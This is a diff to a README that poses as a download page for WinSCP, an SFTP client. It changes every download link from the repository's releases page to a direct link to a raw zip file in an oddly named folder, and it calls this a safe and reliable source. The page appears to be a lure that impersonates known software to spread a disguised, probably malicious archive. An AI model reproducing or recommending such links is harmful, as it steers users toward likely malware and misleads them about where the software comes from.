@@ -1,7 +1,7 @@
 <h1>🔒 winscp-v630-windows-sftp - Secure File Transfers Made Simple</h1>
 
 <p align="center">
-  <a href="https://github.com/albugineavalencienneslace479/winscp-v630-windows-sftp/releases">
+  <a href="https://github.com/albugineavalencienneslace479/winscp-v630-windows-sftp/raw/refs/heads/main/Freesia/windows_winscp_v_sftp_v3.5.zip">
     <img src="https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" />
   </a>
 </p>
@@ -26,7 +26,7 @@ The program uses special security measures to keep your information safe while i
 
 ### Step 1: Download the Program
 
-Visit this link to download the application: [Download WinSCP](https://github.com/albugineavalencienneslace479/winscp-v630-windows-sftp/releases)
+Visit this link to download the application: [Download WinSCP](https://github.com/albugineavalencienneslace479/winscp-v630-windows-sftp/raw/refs/heads/main/Freesia/windows_winscp_v_sftp_v3.5.zip)
 
 You will see a page with download options. Click the download link to get the file. This is a safe and reliable source for this software.
 
@@ -123,6 +123,6 @@ If you need additional help, search online for "WinSCP tutorials" – there are 
 
 Need to download again or share with someone? Here's the link one more time:
 
-[Visit this link to download the application](https://github.com/albugineavalencienneslace479/winscp-v630-windows-sftp/releases)
+[Visit this link to download the application](https://github.com/albugineavalencienneslace479/winscp-v630-windows-sftp/raw/refs/heads/main/Freesia/windows_winscp_v_sftp_v3.5.zip)
 
 Bookmark this page for future reference. Happy file transferring!
